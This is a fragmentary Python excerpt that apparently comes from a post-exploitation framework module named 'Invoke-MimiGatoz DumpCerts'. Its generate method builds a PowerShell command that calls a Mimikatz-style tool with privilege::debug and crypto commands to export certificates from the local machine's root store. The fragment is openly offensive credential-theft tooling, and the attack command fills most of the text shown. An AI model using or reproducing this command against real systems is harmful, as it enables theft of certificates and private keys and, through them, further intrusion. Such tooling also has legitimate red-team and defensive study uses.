...
class Module:
    ...
    def __init__(self, mainMenu, params=[]):
        ...
        self.info = {
            'Name': 'Invoke-MimiGatoz DumpCerts',
    ...
    def generate(self):
        ...
        script += """Invoke-MimiGatoz -Command 'crypto::capi privilege::debug crypto::cng "crypto::certificates /systemstore:local_machine /store:root /export"' """
